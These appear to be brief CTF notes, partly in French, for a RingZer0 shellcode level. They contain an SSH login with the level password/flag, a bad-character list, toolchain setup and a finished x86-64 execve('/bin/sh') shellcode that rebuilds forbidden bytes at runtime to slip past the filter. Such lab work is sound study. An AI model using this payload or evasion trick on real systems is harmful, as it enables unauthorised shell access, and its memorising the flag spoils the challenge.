ssh level3@challenges.ringzer0ctf.com -p 10127

Mot de passe: FLAG-351p97Rd81169t7d4904K6031S

Cette fois le payload de la question précédente a des caractères illégaux:
"\x0a\x0d\x2f\x2e\x62\x48\x98\x99\x30\x31" 

On va tenter de le construire dynamiquement



docker run -it --rm -v $(pwd):/work ubuntu:20.04 bash
apt-get update && apt-get install -y nasm binutils





This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\x2e\x62\x48\x98\x99\x30\x31" max size 50 bytes.
Flag is in /home/level3/level3.flag       

\x68\x2d\x63\x69\x6e\xc7\x44\x24\x04\x2d\x73\x68\x01\xfe\x04\x24\xfe\x04\x24\xfe\x4c\x24\x01\xfe\x44\x24\x04\xfe\x44\x24\x04\xfe\x4c\x24\x07\x6a\x00\x5a\x6a\x00\x5e\x6a\x3b\x58\x0f\x05